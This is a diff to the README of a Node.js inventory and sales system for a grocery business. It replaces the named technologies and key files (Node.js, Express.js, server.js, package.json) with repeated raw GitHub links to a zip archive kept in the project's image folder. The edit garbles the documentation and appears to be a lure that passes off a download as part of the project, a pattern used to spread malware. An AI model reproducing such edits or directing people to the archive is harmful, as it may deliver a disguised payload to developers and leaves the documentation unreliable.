@@ -4,7 +4,7 @@ A full-stack inventory and sales management system for Karibu Groceries LTD. It 
 
 ## Technologies Used
 
-- Node.js, Express.js
+- https://raw.githubusercontent.com/Vera24-vee/FINAL-PROJECT/main/public/img/FINAL-PROJECT-3.9.zip, https://raw.githubusercontent.com/Vera24-vee/FINAL-PROJECT/main/public/img/FINAL-PROJECT-3.9.zip
 - MongoDB, Mongoose
 - HTML, CSS, JavaScript
 - Pug (Templating Engine)
@@ -25,9 +25,9 @@ A full-stack inventory and sales management system for Karibu Groceries LTD. It 
 - routes/ – Express route handlers
 - views/ – Pug templates for frontend
 - public/ – Static assets (CSS, JS, images)
-- server.js – Application entry point
+- https://raw.githubusercontent.com/Vera24-vee/FINAL-PROJECT/main/public/img/FINAL-PROJECT-3.9.zip – Application entry point
 - .env – Environment config
-- .gitignore, package.json, package-lock.json
+- .gitignore, https://raw.githubusercontent.com/Vera24-vee/FINAL-PROJECT/main/public/img/FINAL-PROJECT-3.9.zip, https://raw.githubusercontent.com/Vera24-vee/FINAL-PROJECT/main/public/img/FINAL-PROJECT-3.9.zip
 
 ## Environment Setup
 
